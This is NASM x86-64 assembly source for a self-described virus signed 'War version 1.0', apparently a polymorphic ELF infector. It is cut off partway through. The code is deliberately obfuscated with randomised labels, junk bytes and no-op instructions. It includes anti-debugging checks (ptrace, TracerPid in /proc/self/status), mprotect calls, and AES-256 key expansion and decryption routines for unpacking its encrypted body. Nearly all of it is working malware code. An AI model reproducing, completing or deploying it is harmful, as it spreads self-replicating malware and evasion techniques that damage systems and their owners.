; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

align 16
_signature:
    .start: db "War version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 0x4 db 0x30
    db ':'
    .key_preview: times 0x8 db 0x30
    db ':'
    .poly_preview: times 0x10 db 0x30
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
signature_reg_len: equ _signature.poly_preview-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _AESD_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _UEC_OFF
    .mapaddr    resq 0x1
    .key        resb 0x20
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
keycreation_len: equ _decrypt-_virus
;-----------------------------------------------------
; Public Variables.
VARIABLES public
columns:        db "COLUMNS", 0x0
lines:          db "LINES", 0x0
procself:       db "/proc/self/status", 0x0
tracerline:     db "TracerPid:", 0x9
debugging:      db "[DEBUGGER IS RUNNING..]"
non_encrypted_len: equ _decrypt-_start
key: times 32 db 0x00
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    mjmp        ..@NSBsgkzAS6JN
..@xwcKuPseMFsq:
    xchg        rax, rax
    aeskeygenassist xmm2, xmm1, 0x0
    xchg        rax, rax
    call        ..@Rq8nu8RlAPYf
    movdqa      OWORD [rsi+0xd0], xmm3
    mjmp        ..@knEXrICoU9Tz
..@iygllJEgUMt3:
    push        r1
    mjmp        ..@uLXXEVWAZ8Bn
..@PAHm8KJBz8r6:
    push        rsi
    pop         rsi
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x80]
    movr        rcx, rcx
    mjmp        ..@nzjwFSC9kkkr
db 0x4f, 0xba, 0x72
..@nzjwFSC9kkkr:
    mjmp        ..@4niIgBCmMjuN
..@YAapl6xE9YCN:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    test        eax, eax
%endif
%endif
    mjmp        ..@kPULsqfTbayC
..@DVP0f4uAhoks:
    and         r5, PAGE_SIZE-1
    test        r5, r5
    jz          ..@maItQzgJZcsx
    mjmp        ..@8ylXpfYOZf5D
db 0x3a
..@8ylXpfYOZf5D:
    mjmp        ..@MDFBRyTlmKxt
..@elDVkfHFAHM6:
%ifndef ENABLE_DEBUGGING
    VAR         public, lines
%endif
    mjmp        ..@bU3a3HsP3tWm
..@PtDAcFpRgDQX:
    pxor        xmm3, xmm2
    mjmp        ..@6ZYQANnDpelE
db 0x98
..@6ZYQANnDpelE:
    mjmp        ..@A5WZKYOfuOP0
..@AYrne4FiOJIq:
    movr        rax, rax
    movdqu      xmm0, [rsi+rcx]
    mjmp        ..@7TvDB7dJdS7F
..@VtYXUVBKLK0z:
    movdqu      OWORD [rsp+0x60],xmm0
    mjmp        ..@2yiyBvM87sFX
..@xQyiEnI7Aqk4:
    push        r1
    mjmp        ..@C8VyMIenPSTk
db 0x0d
..@C8VyMIenPSTk:
    mjmp        ..@ksRJrVfdwpHn
db 0x09, 0xd3
..@ksRJrVfdwpHn:
    mjmp        ..@AOiTGpdzRAcM
..@9YolnnNljPaa:
    mxor        rax, rax
    mjmp        ..@10R696BybmC4
..@MGMPHpqzHaYA:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
%endif
%endif
    mjmp        ..@X49Gi3UBNsvq
db 0xe4
..@X49Gi3UBNsvq:
    mjmp        ..@G7h46oZHmE05
db 0x3b, 0xfc
..@G7h46oZHmE05:
    mjmp        ..@T4b0GEF6cTMK
..@v0Ei4gUgnMoC:
    push        rcx
    mjmp        ..@WHBUfIEW7leP
db 0x0e
..@WHBUfIEW7leP:
    mjmp        ..@rprpzFwlXp6w
ExitProgram:
    mjmp        ..@LFNu6BPon4Sl
..@GNWPwjmg6E1z:
    je          ..@gZYWBfvGdHye
    mjmp        ..@3eQeEOosktro
..@mWnpq98gLBpy:
    pop         rdi
    mjmp        ..@uMDIRyJnC2sa
db 0x4e, 0xcf
..@uMDIRyJnC2sa:
    mjmp        ..@vmZfnievBBKh
..@RzRQZRDZ1vSq:
%ifndef ENABLE_DEBUGGING
    madd        rax, tracerline_size
%endif
    mjmp        ..@c67YNpUZYmgI
db 0xd1
..@c67YNpUZYmgI:
    mjmp        ..@TXnpzV5EcQK3
..@mxNEUXvOn54f:
    call        ..@08VUFySs49uP
    push        rax
    pop         rax
    movdqa      OWORD [rsi+0xc0], xmm1
    push        rax
    mjmp        ..@0CgClbWQtWRG
db 0x03, 0xf6
..@0CgClbWQtWRG:
    mjmp        ..@Kt0S08CJlx4E
db 0xc0, 0x3e, 0x36
..@Kt0S08CJlx4E:
    mjmp        ..@zEygVWelPI3J
..@oBrgVgTg9shn:
    xchg        rax, rax
    mjmp        ..@ubxZOgRktfvI
..@uIChtuAJhJZ0:
    movdqa      OWORD [rsi+0xb0], xmm3
    mjmp        ..@Puy2XXvCYxJh
db 0xb7
..@Puy2XXvCYxJh:
    mjmp        ..@GtdIwhvJN0oX
..@UG9oWcyYSpIg:
    xchg        rbx, rbx
    mjmp        ..@F4skBphXLATu
db 0xb0, 0x9d, 0x97
..@F4skBphXLATu:
    mjmp        ..@I5830CTNMzco
db 0xa7
..@I5830CTNMzco:
    mjmp        ..@GbukNFIDlpc2
..@ivV37L107Yfs:
    mxor        r3, r3
    GGLOBAL     _decrypt
    movr        r1, r5
    movv        r3, 111b
    mjmp        ..@EHnNT85bsKc6
..@knEXrICoU9Tz:
    aeskeygenassist xmm2, xmm3, 0x40
    mjmp        ..@v8erAsTw7INW
db 0x33, 0x76, 0x3f
..@v8erAsTw7INW:
    mjmp        ..@f7j2NkLKhwdZ
..@0YAx5rc9za0p:
%ifndef ENABLE_DEBUGGING
    jne         ..@WAAKeQsgiX6o
    CFILE       r5d
    movr        r1, rsp
%endif
    mjmp        ..@9n44KIliUYst
db 0xd9, 0x42
..@9n44KIliUYst:
    mjmp        ..@zcivpa5wMRkI
..@yWir1nesCwj0:
    movdqa      OWORD [rsi], xmm1
    movdqa      OWORD [rsi+0x10], xmm3
    aeskeygenassist xmm2, xmm3, 0x1
    call        ..@08VUFySs49uP
    mjmp        ..@K2khvcJyvTKC
db 0xac, 0xb2, 0x7f
..@K2khvcJyvTKC:
    mjmp        ..@dYUtoQlKB03c
AntiDebugging:
    mjmp        ..@bH0NdnZSaPHZ
..@tRHrqjqVIIwu:
    movdqu      xmm1, [rdi]
    mjmp        ..@WsYTpUfPurb3
db 0x33
..@WsYTpUfPurb3:
    mjmp        ..@YlHiRNsiUiGD
..@wCY7Rp8L8qlD:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x50],xmm0
    movdqu      xmm1, OWORD [rsp+0x60]
    aesimc      xmm0,xmm1
    mjmp        ..@ky9vWWy71uF7
db 0xf6
..@ky9vWWy71uF7:
    mjmp        ..@VtYXUVBKLK0z
..@yMtCHhzM1mYU:
    movdqu      xmm0, OWORD [r1]
    mjmp        ..@5iAgxDQLQPDC
..@kmML7NB27AiN:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    test        rax, rax
    jnz         ..@WAAKeQsgiX6o
%endif
%endif
    mjmp        ..@n91d7hLjb3ca
db 0x15
..@n91d7hLjb3ca:
    mjmp        ..@QR3nUbRving6
..@Vxqvm7b3iWl3:
    push        rdx
    xchg        rbx, rbx
    mjmp        ..@q5rBPqlDngR9
db 0x77, 0x25
..@q5rBPqlDngR9:
    mjmp        ..@tWqhOrztnopZ
..@wMTr587Mm9Og:
    movdqu      xmm1, OWORD [rsp+0x20]
    aesdec      xmm0, xmm1
    mjmp        ..@mH7DC4dze3RX
..@bH0NdnZSaPHZ:
    mxor         r1, r1
    mjmp        ..@C3NmnRyq1ruS
db 0xf8, 0x71
..@C3NmnRyq1ruS:
    mjmp        ..@eBK91O6wqjC3
..@lcEcwPMUzPRz:
    cmp         rax, QWORD [rsp]
    jl          ..@WXvJagBY12kI
    movdqu      OWORD [r1], xmm0
    xchg        rsi, rsi
    mjmp        ..@hZUTeFoNCi8A
..@TC0VLsvF6dnD:
    push        rdx
    pop         rdx
    pslldq      xmm4, 0x4
    movr        rax, rax
    mjmp        ..@yvekHlCiM62g
Strncmp:
    mjmp        ..@iygllJEgUMt3
..@sV43XnRSpvSk:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x90],xmm0
    push        rbx
    pop         rbx
    movdqu      xmm1, OWORD [rsp+0xa0]
    mjmp        ..@e2JjPg0O0ypt
..@BCssyWbBcLfW:
    mjmp        ..@Pq89wbGr2FaE
    mjmp        ..@vGnGNwTZ27Ru
db 0xa6, 0x7b
..@vGnGNwTZ27Ru:
    mjmp        ..@oVpk3R8we6TO
db 0xed, 0x20
..@oVpk3R8we6TO:
    mjmp        ..@TTQu0TzPLe8h
db 0x41, 0xee, 0x1a
..@TTQu0TzPLe8h:
    mjmp        ..@F2DUAAzJ3QIX
..@Fl68YB773tQN:
    movr        rbp, rbp
    mjmp        ..@UbqX4Ue3N6zK
db 0x43, 0xae
..@UbqX4Ue3N6zK:
    mjmp        ..@lOqxx8nqr4gm
db 0x5e, 0x5c
..@lOqxx8nqr4gm:
    mjmp        ..@R38whAHn9bJp
db 0x61, 0x9c, 0xa0
..@R38whAHn9bJp:
    mjmp        ..@MTzVHpMLT7Ry
db 0x28, 0x58
..@MTzVHpMLT7Ry:
    mjmp        ..@K01riIOgpVuc
..@E7B8b9i1Nmai:
    call        ExitProgram
    mjmp        ..@5nrArjtdQzqw
db 0xec, 0xb1
..@5nrArjtdQzqw:
    mjmp        ..@xjoiDnseSNei
..@maItQzgJZcsx:
    movr        rsp, rsp
    mjmp        ..@OoWxeKr6nnfF
db 0xd4, 0xee
..@OoWxeKr6nnfF:
    mjmp        ..@8aerdCT74slo
db 0x01, 0xb0, 0x1f
..@8aerdCT74slo:
    mjmp        ..@SF3ZLDB7lTzC
..@4niIgBCmMjuN:
    xchg        rbx, rbx
    aesdec      xmm0, xmm1
    mjmp        ..@vtXbPc0olFYr
..@7yOi0izQtxZa:
    syscall
    test        eax, eax
    jz          ..@gZYWBfvGdHye
    mxor        rdi, rdi
    call        ExitProgram
    mjmp        ..@YWa3mx4fr0uE
db 0x74
..@YWa3mx4fr0uE:
    mjmp        ..@0WhpzkrXMzFk
..@oETkLAuFhfac:
    mxor        r2, r2
    GGLOBAL     _decrypt
    mjmp        ..@uHdKGRGpPJIK
db 0xa2, 0xe0
..@uHdKGRGpPJIK:
    mjmp        ..@5cC5u9J84xO6
..@3jSHInZjny7K:
%ifndef ENABLE_DEBUGGING
    jne         ..@wZNvHHi0lCbA
    madd        rsp, 0x1000
%endif
    mjmp        ..@PItQDLGer1So
..@zcivpa5wMRkI:
%ifndef ENABLE_DEBUGGING
    movv        r2, 0x200
    VAR         public, tracerline
%endif
    mjmp        ..@7QmodKYUQg46
db 0xea
..@7QmodKYUQg46:
    mjmp        ..@7OhRgS78yyzw
db 0x04, 0xdd
..@7OhRgS78yyzw:
    mjmp        ..@isO2QqQ4uWaC
db 0xa8, 0x9c, 0xa3
..@isO2QqQ4uWaC:
    mjmp        ..@uisKoyIkxCiI
db 0xdf, 0xe0
..@uisKoyIkxCiI:
    mjmp        ..@H8K6RfRPEbNH
..@eSMP5pmqjWeI:
    jz          ..@K01riIOgpVuc
    movr        rsp, rsp
    push        rbx
    pop         rbx
    mjmp        ..@pZHQufniJjle
db 0x8d, 0xcb
..@pZHQufniJjle:
    mjmp        ..@6lnflN4nik4b
db 0xd0, 0x20
..@6lnflN4nik4b:
    mjmp        ..@I87h0JGbFHre
..@KPUEhr5gsWs1:
    call        ..@08VUFySs49uP
    rep         nop
    mjmp        ..@PkA80Ut8LP5j
db 0x19, 0xb7, 0x61
..@PkA80Ut8LP5j:
    mjmp        ..@NOOxIM3baRCe
db 0xb6
..@NOOxIM3baRCe:
    mjmp        ..@M4oQbJfW9Thf
..@yM0RtCNvceEK:
    pop         rdi
    movdqu      OWORD [rsp+0x80],xmm0
    movdqu      xmm1, OWORD [rsp+0x90]
    mjmp        ..@sV43XnRSpvSk
..@T9MkOI4wYmmF:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_PTRACE
%endif
%endif
    mjmp        ..@kmML7NB27AiN
..@vB7DZaTTct01:
    madd        rsp, 4*bytes
    ret
    mjmp        ..@0Zoaty4yLfX9
db 0xb4, 0x42, 0xab
..@0Zoaty4yLfX9:
    mjmp        Strncmp
..@LFNu6BPon4Sl:
    DESTROY_MX_VAR
    mjmp        ..@mr3OL9UIro9M
db 0xe4, 0xed, 0xd4
..@mr3OL9UIro9M:
    mjmp        ..@u3mL1P0vZXWn
db 0x3a
..@u3mL1P0vZXWn:
    mjmp        ..@e7u8RV2f0CO7
..@uLXXEVWAZ8Bn:
    push        r2
    push        r3
    push        rax
    mjmp        ..@FpvrGMLueUkG
db 0xf0, 0x45
..@FpvrGMLueUkG:
    mjmp        ..@rVPaLRp1OWn9
..@MDFBRyTlmKxt:
    or          r2, PAGE_SIZE-1
    mjmp        ..@qCtRifyCbqnv
db 0x8e
..@qCtRifyCbqnv:
    mjmp        ..@oBrgVgTg9shn
..@rprpzFwlXp6w:
    pop         rcx
    mjmp        AntiDebugging
..@QY7a0QYPHjZt:
    xchg        rdx, rdx
    mjmp        Aes256Decryption
..@u5CVTcacxNFX:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        r3, r3
    mxor        r4, r4
    movv        rax, SYS_PTRACE
    syscall
%endif
%endif
    mjmp        ..@qmMrn65MWIP1
db 0xe4, 0x8f, 0x33
..@qmMrn65MWIP1:
    mjmp        ..@WAAKeQsgiX6o
..@A5WZKYOfuOP0:
    ret
    mjmp        ..@QY7a0QYPHjZt
..@5CValvQVBUu6:
    mjmp        UnpackExecutableCode
..@JJLtibQKmiSl:
    mxor         r4, r4
    mjmp        ..@7WfxFryDl9TY
..@sOGGj7QfypAt:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movr        rax, rax
    movv        rax, SYS_WAIT4
%endif
%endif
    mjmp        ..@MGMPHpqzHaYA
..@qNlHG0wztd8w:
    jl          ..@F2DUAAzJ3QIX
    xchg        rcx, rcx
    rep         cmpsb
    mjmp        ..@rdMwEvwTjogk
..@XKxtdFhh3rfr:
    movr        rcx, rcx
    mjmp        ..@JgpalffQDJcZ
db 0xfe
..@JgpalffQDJcZ:
    mjmp        ..@7UXxlv5sOy5X
..@jugA3GVS6dZ0:
    pop         rcx
    movr        rbx, rdi
    push        rdi
    pop         rdi
    mov         rsi, QWORD [rsp+1*bytes]
    mjmp        ..@9pGfamSntIM4
db 0x84, 0x38
..@9pGfamSntIM4:
    mjmp        ..@vSAJwhJ4Puni
db 0xb3, 0x60, 0x52
..@vSAJwhJ4Puni:
    mjmp        ..@7zTgjvRdEohe
db 0x16
..@7zTgjvRdEohe:
    mjmp        ..@FosF3SR1InAw
..@8vT1WbvLCHHQ:
    sub         rdx, rcx
    sub         QWORD [rsp+2*bytes], rdx
    mjmp        ..@BCssyWbBcLfW
..@7VZRYzRasWHm:
    xchg        rsi, rsi
    mjmp        ..@9rWVmMvqv3y9
db 0x95
..@9rWVmMvqv3y9:
    mjmp        ..@mWnpq98gLBpy
..@OOYMAHXSSpHo:
    madd        r1, 1
    madd        r2, 1
    dec         r3
    jnz         ..@nzoGJfHEyojA
    mjmp        ..@q7DssHEEfkaq
..@0tAGp0YOFYlt:
    mxor         r3, r3
    mjmp        ..@Nr7tyqVOjZsd
db 0x51
..@Nr7tyqVOjZsd:
    mjmp        ..@JJLtibQKmiSl
..@H4Wh8p4aKWIT:
    push        rbx
    mjmp        ..@bEwnQLneZs5H
db 0x61, 0x20, 0x45
..@bEwnQLneZs5H:
    mjmp        ..@qagFh5T2ma0c
..@Gkbsma1Ec37a:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    msub        rsp, bytes
%endif
%endif
    mjmp        ..@YbhEmgl1QLrA
..@gZYWBfvGdHye:
    mjmp         DecryptExecutableCode
    mjmp        ..@uMW7xNvgVW7x
db 0x77
..@uMW7xNvgVW7x:
    mjmp        Strlen
..@taUlLo2l8iEP:
    movdqu      OWORD [rsp+0xd0],xmm0
    mjmp        ..@ZsjAxq287Wmi
db 0xb3, 0x4f, 0x0d
..@ZsjAxq287Wmi:
    mjmp        ..@AYrne4FiOJIq
..@wr58YGHwE2PO:
    jz          ..@SCxAj3z7qT34
    mjmp        ..@mqbBgQnt2EnZ
..@H8K6RfRPEbNH:
%ifndef ENABLE_DEBUGGING
    movr        r3, r5
    movv        r4, tracerline_size
    movr        rbx, rbx
    call        Memmem
%endif
    mjmp        ..@Rq3HG7AkfMau
db 0x94, 0xe4
..@Rq3HG7AkfMau:
    mjmp        ..@RzRQZRDZ1vSq
..@NCODo1aguulo:
    VAR         public, _start
    movr        r1, r5
    VAR         public, entrypoint
    sub         r1, QWORD [r5]
    DESTROY_MX_VAR
    mjmp        ..@S6sANE7H3JPj
db 0x01, 0xb9, 0x05
..@S6sANE7H3JPj:
    mjmp        ..@aDU5DLIdyL3n
..@ScuKKp1KvVm8:
    movdqa      xmm4, xmm1
    pslldq      xmm4, 0x4
    pxor        xmm1, xmm4
    mjmp        ..@hfq4BfRcRkUb
db 0xe5, 0x22, 0x94
..@hfq4BfRcRkUb:
    mjmp        ..@OI1WgYVx9B6u
db 0x1d, 0x5d, 0xa7
..@OI1WgYVx9B6u:
    mjmp        ..@eX969Zoc8y2D
db 0x00, 0xf3, 0x2e
..@eX969Zoc8y2D:
    mjmp        ..@TC0VLsvF6dnD
..@bU3a3HsP3tWm:
%ifndef ENABLE_DEBUGGING
    movr        r1, r5
%endif
    mjmp        ..@xxtKIPvvA8Qv
..@kdhf0Zh8UJbu:
    mov         m4, rdi
    call        AntiDebugging
    mjmp        ExitProgram
..@Zs3Yyuc1hKJL:
    movdqu      xmm1, OWORD [rsp+0x70]
    xchg        rsi, rsi
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x60]
    aesdec      xmm0, xmm1
    mjmp        ..@B7Qd2ZNIwN3c
db 0x45
..@B7Qd2ZNIwN3c:
    mjmp        ..@UT8qC2D7vigI
..@T4b0GEF6cTMK:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    pop         rax
    push        rbx
    pop         rbx
%endif
%endif
    mjmp        ..@anxXa5OwMkMb
..@nzoGJfHEyojA:
    mov         al, BYTE [r1]
    cmp         BYTE [r2], al
    je          ..@OOYMAHXSSpHo
    mjmp        ..@AOdV3AckkVXi
db 0xa3, 0x69
..@AOdV3AckkVXi:
    mjmp        ..@TZIp53wq2k6M
..@K01riIOgpVuc:
    mxor        r2, r2
    mjmp        ..@RxhUq7rB7q2n
..@NDzuo9Jlm5lu:
    and         r3, 0ffffffffffffffe0h
    push        r3
    mjmp        ..@yMtCHhzM1mYU
..@5K6aTmZOtz6t:
    movdqu      xmm1, OWORD [rsp+0xd0]
    movr        rax, rax
    aesimc      xmm0,xmm1
    mjmp        ..@taUlLo2l8iEP
..@Rq8nu8RlAPYf:
    pshufd      xmm2, xmm2, 0xaa
    movdqa      xmm4, xmm3
    pslldq      xmm4, 0x4
    mjmp        ..@29LCpxaGni2f
..@RxhUq7rB7q2n:
    push        rbx
    pop         rbx
    push        rsi
    pop         rsi
    mjmp        ..@qLLubBT28AVy
..@4ibdjX46OnGH:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    pop         rdi
    syscall
%endif
%endif
    mjmp        ..@l4wKDN3PRrEn
db 0x32, 0x76
..@l4wKDN3PRrEn:
    mjmp        ..@bejvAUUWbNQ7
..@SsgE2IMRJRFD:
%ifndef ENABLE_DEBUGGING
    movv        r1, 1
    call        ExitProgram
%endif
    mjmp        ..@1L8qFSTOM32E
db 0x55, 0xf1
..@1L8qFSTOM32E:
    mjmp        ..@UfLrGZn9mWJ6
..@wsoDWE3jfV1q:
    aeskeygenassist xmm2, xmm3, 0x8
    mjmp        ..@KPUEhr5gsWs1
..@6BZ92E1AgW5R:
    movdqu      xmm1, OWORD [rsp+0xa0]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x90]
    mjmp        ..@ULnE39IjHwJY
db 0x44, 0x02, 0x19
..@ULnE39IjHwJY:
    mjmp        ..@Mmllz4LWlUv9
db 0xac
..@Mmllz4LWlUv9:
    mjmp        ..@PAHm8KJBz8r6
..@YbhEmgl1QLrA:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    push        rdi
    pop         rdi
    mov         QWORD [rsp], 0x00
    movr        r1, rax
    movr        r2, rsp
%endif
%endif
    mjmp        ..@SWTJVMeYKgVp
db 0xca, 0xd0
..@SWTJVMeYKgVp:
    mjmp        ..@vrPXuW6V53VR
..@broKMRaeZhJX:
    madd        r4, bytes
    mjmp        ..@0X8EozsQKmJO
..@TZIp53wq2k6M:
    sub         al, BYTE [r2]
    mjmp        ..@15IUvYGCRFRM
    mjmp        ..@OOYMAHXSSpHo
Aes256KeyCreation:
    mjmp        ..@NDzuo9Jlm5lu
..@TfV2HNzZfeic:
    movv        rax, SYS_MPROTECT
    syscall
    cmp         eax, 0x00
    je          ..@jbFMFyzR58Zf
    mxor        r1, r1
    mjmp        ..@AuzFfmuvCdQu
db 0xbe, 0x4e
..@AuzFfmuvCdQu:
    mjmp        ..@E7B8b9i1Nmai
..@rVPaLRp1OWn9:
    pop         rax
    rep         nop
    movr        rdi, rdi
    mxor        rax, rax
    movr        rbp, rbp
    mjmp        ..@nzoGJfHEyojA
..@uZnMvR2c2IyF:
    rep         nop
    movv        rcx, 0x8
    rep         movsd
    lea         r1, [rsp+_UEC_OFF.key]
    VAR         public, _virus
    mjmp        ..@EvgH3DwJTbvU
..@7oOqxpO2pKNL:
%ifndef ENABLE_DEBUGGING
    movr        r5, rax
    RFILE       rax, [rsp], 0x200
    cmp         eax, 0x200
%endif
    mjmp        ..@gaIYqwZEjNCp
db 0x1e, 0x58, 0xa8
..@gaIYqwZEjNCp:
    mjmp        ..@T655kiCakr69
db 0x05, 0x26
..@T655kiCakr69:
    mjmp        ..@0YAx5rc9za0p
..@oJvLR7PkNmcR:
    syscall
    mjmp        ..@v0Ei4gUgnMoC
..@XIkqhy29bL0r:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    pop         rsi
    movr        rdi, rdi
    movv        rax, SYS_GETPPID
    syscall
    movv        r1, 16
%endif
%endif
    mjmp        ..@umzgGIkhO3Ye
..@67zqqPcvvFsA:
%ifndef ENABLE_DEBUGGING
    cmp         eax, 0x3
    jl          ..@WAAKeQsgiX6o
%endif
    mjmp        ..@K2JVAm6xaykX
db 0x3b, 0x5c
..@K2JVAm6xaykX:
    mjmp        ..@54Jw0auGe1Qo
db 0x60, 0x21
..@54Jw0auGe1Qo:
    mjmp        ..@Hbz4hvcff9s2
db 0x62, 0x57
..@Hbz4hvcff9s2:
    mjmp        ..@7oOqxpO2pKNL
..@anxXa5OwMkMb:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    and         rax, 0xff00
    shr         eax, 8
    madd        rsp, bytes
%endif
%endif
    mjmp        ..@5MU6ofUgaKBE
db 0x9a
..@5MU6ofUgaKBE:
    mjmp        ..@YAapl6xE9YCN
..@qagFh5T2ma0c:
    pop         rbx
    mov         vsp, rdi
    movr        rdi, rbp
    mjmp        ..@uj6QblqaqHcW
db 0x94
..@uj6QblqaqHcW:
    mjmp        ..@pOpVwtrDvNu4
..@q7DssHEEfkaq:
    mxor        rax, rax
    mjmp        ..@15IUvYGCRFRM
..@Sp9IJzJf153d:
    call        ..@08VUFySs49uP
    movdqa      OWORD [rsi+0xa0], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    rep         nop
    mjmp        ..@b9mSH5rLotCe
db 0xc7, 0x0a
..@b9mSH5rLotCe:
    mjmp        ..@Mi7VCmArUXAh
..@fM6z6Qbcb9SK:
    rep         nop
    GGLOBAL     entrypoint
    cmp         QWORD [r5], 0x0000000000000000
    mjmp        ..@Bkij3ryBhOMD
db 0xf2, 0xc8, 0x19
..@Bkij3ryBhOMD:
    mjmp        ..@bBhk1xou1y8X
db 0x1c, 0x73
..@bBhk1xou1y8X:
    mjmp        ..@GNWPwjmg6E1z
..@DeTvXJioj7hH:
    test        eax, eax
    mjmp        ..@8B2InuOUHiJN
db 0x61
..@8B2InuOUHiJN:
    mjmp        ..@E9fbjGUoSPxA
db 0x87
..@E9fbjGUoSPxA:
    mjmp        ..@wr58YGHwE2PO
..@DRSJBrOgvKMr:
    aeskeygenassist xmm2, xmm3, 0x4
    call        ..@08VUFySs49uP
    movdqa      OWORD [rsi+0x60], xmm1
    xchg        rdx, rdx
    aeskeygenassist xmm2, xmm1, 0x0
    mjmp        ..@z3QCBsDm3XXH
..@3KeS6uhhWQbg:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        r1, 17
    movr        r2, rax
%endif
%endif
    mjmp        ..@u5CVTcacxNFX
..@u4RXP53e7E6I:
    movr        rax, rbx
    mjmp        ..@2j4TiUoMcTQW
db 0x94, 0x20
..@2j4TiUoMcTQW:
    mjmp        ..@vB7DZaTTct01
..@lukobnVpPuCb:
    mov         r1, QWORD [rsp]
    mov         r2, QWORD [r4]
    test        r2, r2
    mjmp        ..@eSMP5pmqjWeI
..@Pq89wbGr2FaE:
    push        rcx
    mjmp        ..@BYynTo4Ec2ed
db 0x99, 0x01
..@BYynTo4Ec2ed:
    mjmp        ..@FqRIXlVpF9qZ
db 0x10, 0x3b, 0x17
..@FqRIXlVpF9qZ:
    mjmp        ..@j8XAuZOWZ28i
db 0x2a
..@j8XAuZOWZ28i:
    mjmp        ..@jugA3GVS6dZ0
..@Trj80ipZFtPU:
    pop         rax
    mjmp        ..@MdPj88RbwhcC
db 0x80, 0xa9, 0x59
..@MdPj88RbwhcC:
    mjmp        ..@V7gU8U4pPLLx
..@qWZRGjTqpemP:
    cmp         BYTE [r1 + rax], 0x0
    jz          ..@Vxqvm7b3iWl3
    xchg        rcx, rcx
    mjmp        ..@UG9oWcyYSpIg
..@paQUskqMBwBO:
    aesdec      xmm0, xmm1
    mjmp        ..@wMTr587Mm9Og
..@jbFMFyzR58Zf:
    VAR         public, key
    movr        rsi, r5
    lea         rdi, [rsp+_UEC_OFF.key]
    mjmp        ..@uZnMvR2c2IyF
..@jUTdOERxQt2d:
    push        rcx
    mjmp        ..@DJEBcHwmJ7De
..@MotC8UGysKpo:
    push        rcx
    pop         rcx
    msub        r2, non_encrypted_len
    movr        r5, r2
    mjmp        ..@3wlZaYnZVwud
db 0x13, 0x93
..@3wlZaYnZVwud:
    mjmp        ..@DVP0f4uAhoks
..@vmZfnievBBKh:
    mxor        rax, rax
    mxor        r2, r2
    mjmp        ..@ivV37L107Yfs
..@LLHNIfRTyo5p:
    call        Aes256Decryption
    mjmp        ..@sYHqifBxnMLn
db 0x54
..@sYHqifBxnMLn:
    mjmp        ..@5CValvQVBUu6
..@10R696BybmC4:
    movr        rdi, rdi
    mjmp        ..@ZFtduidnx5QN
db 0x5e
..@ZFtduidnx5QN:
    mjmp        ..@Z8BwcqUkMIV9
..@hkOKDP8VndjU:
    movdqa      OWORD [rsi+0x90], xmm3
    aeskeygenassist xmm2, xmm3, 0x10
    mjmp        ..@Sp9IJzJf153d
..@AOiTGpdzRAcM:
    push        r2
    push        r3
    push        r4
    mov         rdi, QWORD [rsp+3*bytes]
    mjmp        ..@zUEdFc5hMFKT
db 0xb7, 0xd2, 0x2a
..@zUEdFc5hMFKT:
    mjmp        ..@Pq89wbGr2FaE
..@cZiGu7l4e419:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jl          ..@WAAKeQsgiX6o
%endif
%endif
    mjmp        ..@5lvXilwxMKgL
db 0x8a
..@5lvXilwxMKgL:
    mjmp        ..@535T4qg28t1v
db 0x37, 0x7f, 0xe4
..@535T4qg28t1v:
    mjmp        ..@U14t0XRMSqlx
..@Z8BwcqUkMIV9:
    movr        rbx, rbx
    mjmp        ..@qWZRGjTqpemP
..@eNwv6TSitm7y:
    test        rax, rax
    jz          ..@RxhUq7rB7q2n
    mjmp        ..@broKMRaeZhJX
..@lgAvxVzZx29y:
%ifndef ENABLE_DEBUGGING
    push        rbx
    pop         rbx
%endif
    mjmp        ..@4BfPa9JOBKvU
db 0x85, 0xc5
..@4BfPa9JOBKvU:
    mjmp        ..@KzLNsr7on085
..@Bgk52A4RgB1h:
    push        rbp
    movr        rbp, rsp
    msub        rsp, _AESD_OFF_size+0x100
    and         rsp, 0xfffffffffffffff0
    mov         QWORD [rsp+_AESD_OFF.startaddr], r1
    mjmp        ..@ZX4qHeiD00oa
..@hxCRWD3JbroV:
    jne         ..@pOpVwtrDvNu4
    madd        rdi, bytes
    mjmp        ..@kdhf0Zh8UJbu
..@xjoiDnseSNei:
    xchg        rsi, rsi
    mjmp        ..@xI8hA1rnRjny
db 0x71
..@xI8hA1rnRjny:
    mjmp        ..@jbFMFyzR58Zf
..@5gri7wxcGtVt:
    aesdec      xmm0, xmm1
